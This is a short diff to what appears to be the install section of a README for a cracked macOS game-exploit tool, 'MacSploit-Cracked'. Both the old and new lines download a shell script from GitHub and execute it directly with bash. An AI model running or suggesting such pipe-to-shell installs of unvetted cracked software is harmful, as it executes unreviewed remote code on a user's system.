@@ -9,5 +9,5 @@ If you are reading this after that date, contact me on discord **@Insanerst** fo
 Open your terminal and run:
 
 ```bash
-curl -s "https://raw.githubusercontent.com/insanerest/MacSploit-Cracked/refs/heads/main/install.sh" | bash
+bash -c "$(curl -fsSL https://raw.githubusercontent.com/insanerest/MacSploit-Cracked/refs/heads/main/install.sh)"
 ```
